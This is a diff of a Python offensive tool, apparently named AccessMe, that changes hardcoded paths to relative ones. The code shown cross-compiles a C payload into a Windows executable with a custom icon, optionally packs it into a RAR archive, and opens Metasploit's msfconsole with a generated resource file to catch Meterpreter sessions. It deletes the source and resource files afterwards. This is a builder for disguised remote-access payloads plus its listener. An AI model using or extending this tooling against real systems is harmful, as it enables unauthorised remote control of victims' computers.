@@ -170,29 +170,29 @@ def Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON):
 
     while Compiler:
 
-        if ("64") in ARCH:
+        if ("x64") in ARCH:
             if ("Windows") in PLATFORM:
                 if ICON != "":
 
-                    RC = 'id ICON "/root/AccessMe/icon/'
+                    RC = 'id ICON "icon/'
                     RC += ''.join((ICON, '"\n'))
 
-                    with open('/root/AccessMe/icon/AccessMe.rc', 'w') as f:
+                    with open('icon/AccessMe.rc', 'w') as f:
                         f.write(RC)
 
-                    WINDRES = ['windres', '/root/AccessMe/icon/AccessMe.rc', '-O', 'coff', '-o', '/root/AccessMe/icon/AccessMe.res']
+                    WINDRES = ['windres', 'icon/AccessMe.rc', '-O', 'coff', '-o', 'icon/AccessMe.res']
                     subprocess.run(WINDRES, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                    EXE = ['x86_64-w64-mingw32-gcc', 'source.c', '/root/AccessMe/icon/AccessMe.res', '-o', FILENAME,'-mwindows']
+                    EXE = ['x86_64-w64-mingw32-gcc', 'source.c', 'icon/AccessMe.res', '-o', FILENAME,'-mwindows']
                     subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                    RM_SourceFile = ['rm', '/root/AccessMe/source.c']
+                    RM_SourceFile = ['rm', 'source.c']
                     subprocess.run(RM_SourceFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                    RM_RcFile = ['rm', '/root/AccessMe/icon/AccessMe.rc']
+                    RM_RcFile = ['rm', 'icon/AccessMe.rc']
                     subprocess.run(RM_RcFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                    RM_ResFile = ['rm', '/root/AccessMe/icon/AccessMe.res']
+                    RM_ResFile = ['rm', 'icon/AccessMe.res']
                     subprocess.run(RM_ResFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                     print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Compilation completed !\n" + core.amcolors.ENDC)
@@ -215,25 +215,25 @@ def Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON):
             if ("Windows") in PLATFORM:
                 if ICON != "":
 
-                    RC = 'id ICON "/root/AccessMe/icon/'
+                    RC = 'id ICON "icon/'
                     RC += ''.join((ICON, '"\n'))
 
-                    with open('/root/AccessMe/icon/AccessMe.rc', 'w') as f:
+                    with open('icon/AccessMe.rc', 'w') as f:
                         f.write(RC)
 
-                    WINDRES = ['windres_1', '/root/AccessMe/icon/AccessMe.rc', '-O', 'coff', '-o','/root/AccessMe/icon/AccessMe.res']
+                    WINDRES = ['windres_1', 'icon/AccessMe.rc', '-O', 'coff', '-o','icon/AccessMe.res']
                     subprocess.run(WINDRES, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                    EXE = ['i686-w64-mingw32-gcc', 'source.c', '/root/AccessMe/icon/AccessMe.res', '-o', FILENAME,'-mwindows']
+                    EXE = ['i686-w64-mingw32-gcc', 'source.c', 'icon/AccessMe.res', '-o', FILENAME,'-mwindows']
                     subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                    #RM_SourceFile = ['rm', '/root/AccessMe/source.c']
-                    #subprocess.run(RM_SourceFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
+                    RM_SourceFile = ['rm', 'source.c']
+                    subprocess.run(RM_SourceFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                    RM_RcFile = ['rm', '/root/AccessMe/icon/AccessMe.rc']
+                    RM_RcFile = ['rm', 'icon/AccessMe.rc']
                     subprocess.run(RM_RcFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                    RM_ResFile = ['rm', '/root/AccessMe/icon/AccessMe.res']
+                    RM_ResFile = ['rm', 'icon/AccessMe.res']
                     subprocess.run(RM_ResFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                     print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Compilation completed !\n" + core.amcolors.ENDC)
@@ -246,7 +246,7 @@ def Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON):
                     EXE = ['i686-w64-mingw32-gcc', 'source.c', '-o', FILENAME, '-mwindows']
                     subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                    RM_SourceFile = ['rm', '/root/AccessMe/source.c']
+                    RM_SourceFile = ['rm', 'source.c']
                     subprocess.run(RM_SourceFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                     print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Compilation completed !\n" + core.amcolors.ENDC)
@@ -310,14 +310,14 @@ def Compress_Rar(FILENAME):
 
         elif CR == "1":
 
-            os.chdir("/root/AccessMe/output/")
+            os.chdir("output/")
 
             print(core.amcolors.OCRA + core.amcolors.BOLD + " [*] Compression" + core.amcolors.ENDC)
 
             ARCHIVE = FILENAME.replace('.exe', '.rar')
-            ARCHIVE = ARCHIVE.replace('/root/AccessMe/output/', '')
+            ARCHIVE = ARCHIVE.replace('output/', '')
 
-            FILENAME = FILENAME.replace('/root/AccessMe/output/', '')
+            FILENAME = FILENAME.replace('output/', '')
 
             COMPRESS = ['rar', 'a', '-m5', ARCHIVE, FILENAME]
             subprocess.run(COMPRESS, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
@@ -373,10 +373,10 @@ def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE):
                         RC_Meterpreter += "set ExitOnSession false\n"
                         RC_Meterpreter += "exploit -z"
 
-                        with open('/root/AccessMe/AccessMe_To_Msf.rc', 'w') as f:
+                        with open('AccessMe_To_Msf.rc', 'w') as f:
                             f.write(RC_Meterpreter)
 
-                        os.system("gnome-terminal -e 'msfconsole -r /root/AccessMe/AccessMe_To_Msf.rc'")
+                        os.system("gnome-terminal -e 'msfconsole -r AccessMe_To_Msf.rc'")
 
                         core.Clear()
 
@@ -384,7 +384,7 @@ def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE):
 
                         time.sleep(30)
 
-                        RM_MSF_RC = ["rm", "/root/AccessMe/AccessMe_To_Msf.rc"]
+                        RM_MSF_RC = ["rm", "AccessMe_To_Msf.rc"]
                         subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                         print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] RC file deleted." + core.amcolors.ENDC)
@@ -404,10 +404,10 @@ def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE):
                         RC_Meterpreter += "set ExitOnSession false\n"
                         RC_Meterpreter += "exploit -z"
 
-                        with open('/root/AccessMe/AccessMe_To_Msf.rc', 'w') as f:
+                        with open('AccessMe_To_Msf.rc', 'w') as f:
                             f.write(RC_Meterpreter)
 
-                        os.system("gnome-terminal -e 'msfconsole -r /root/AccessMe/AccessMe_To_Msf.rc'")
+                        os.system("gnome-terminal -e 'msfconsole -r AccessMe_To_Msf.rc'")
 
                         core.Clear()
 
@@ -415,7 +415,7 @@ def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE):
 
                         time.sleep(30)
 
-                        RM_MSF_RC = ["rm", "/root/AccessMe/AccessMe_To_Msf.rc"]
+                        RM_MSF_RC = ["rm", "AccessMe_To_Msf.rc"]
                         subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                         print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] RC file deleted." + core.amcolors.ENDC)
@@ -442,17 +442,17 @@ def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE):
                         RC_Meterpreter += "set ExitOnSession false\n"
                         RC_Meterpreter += "exploit -j -z"
 
-                        with open('/root/AccessMe/AccessMe_To_Msf.rc', 'w') as f:
+                        with open('AccessMe_To_Msf.rc', 'w') as f:
                             f.write(RC_Meterpreter)
 
-                        os.system("gnome-terminal -e 'msfconsole -r /root/AccessMe/AccessMe_To_Msf.rc'")
+                        os.system("gnome-terminal -e 'msfconsole -r AccessMe_To_Msf.rc'")
 
                         core.Clear()
 
                         print(core.amcolors.OCRA + core.amcolors.BOLD + " [*] Deletion of the RC file in 30 seconds" + core.amcolors.ENDC)
                         time.sleep(30)
 
-                        RM_MSF_RC = ["rm", "/root/AccessMe/AccessMe_To_Msf.rc"]
+                        RM_MSF_RC = ["rm", "AccessMe_To_Msf.rc"]
                         subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                         print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] RC file deleted." + core.amcolors.ENDC)
@@ -472,10 +472,10 @@ def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE):
                         RC_Meterpreter += "set ExitOnSession false\n"
                         RC_Meterpreter += "exploit -j -z"
 
-                        with open('/root/AccessMe/AccessMe_To_Msf.rc', 'w') as f:
+                        with open('AccessMe_To_Msf.rc', 'w') as f:
                             f.write(RC_Meterpreter)
 
-                        os.system("gnome-terminal -e 'msfconsole -r /root/AccessMe/AccessMe_To_Msf.rc'")
+                        os.system("gnome-terminal -e 'msfconsole -r AccessMe_To_Msf.rc'")
 
                         core.Clear()
 
@@ -484,7 +484,7 @@ def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE):
 
                         time.sleep(30)
 
-                        RM_MSF_RC = ["rm", "/root/AccessMe/AccessMe_To_Msf.rc"]
+                        RM_MSF_RC = ["rm", "AccessMe_To_Msf.rc"]
                         subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                         print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] RC file deleted." + core.amcolors.ENDC)
